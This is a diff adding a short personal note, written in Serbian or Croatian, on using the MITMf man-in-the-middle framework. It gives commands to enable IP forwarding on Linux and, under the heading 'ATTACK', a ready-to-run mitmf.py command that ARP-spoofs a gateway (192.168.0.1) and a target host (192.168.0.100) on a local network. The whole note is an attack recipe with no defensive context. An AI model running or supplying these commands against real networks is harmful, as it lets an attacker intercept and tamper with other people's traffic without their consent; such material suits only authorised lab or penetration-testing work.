@@ -1,0 +1,12 @@
+MITMf
+	
+	Omoguciti "forward" ako je linux masina.
+		echo 1 > /proc/sys/net/ipv4/ip_forward
+ili 
+		sysctl -w net.ipv4.ip_forward=1
+
+	ATTACK
+		python mitmf.py -i eth0 --spoof --arp --gateway 192.168.0.1 --target 192.168.0.100
+
+
+
